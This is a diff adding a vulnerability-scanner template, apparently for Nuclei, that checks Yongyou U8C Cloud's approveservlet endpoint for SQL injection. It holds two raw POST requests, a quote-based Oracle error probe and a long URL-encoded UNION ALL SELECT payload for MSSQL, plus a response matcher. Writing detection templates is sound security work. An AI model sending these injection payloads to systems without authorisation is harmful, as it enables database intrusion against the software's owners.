@@ -1,0 +1,34 @@
+id: yongyou-u8c-cloud-approveservlet-sqli
+
+info:
+  name: yongyou-u8c-cloud-approveservlet-sqli
+  author: yongyou-u8c-cloud-approveservlet-sqli
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /service/approveservlet?oracle HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding:gzip
+        Connection:close
+        Content-Type:application/x-www-form-urlencoded
+        User-Agent:Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+
+        BILLID=123'&BILLTYPE=4331&USERID=3&RESULT=4&DATASOURCE=U8cloud
+
+      - |
+        POST /service/approveservlet?mssql HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding:gzip
+        Connection:close
+        Content-Type:application/x-www-form-urlencoded
+        User-Agent:Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+
+        BILLID=123%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20ZPzR&BILLTYPE=4331&USERID=3&RESULT=4&DATASOURCE=U8cloud
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && (contains_all(body,"ORA-") || contains_all(body,"12321"))
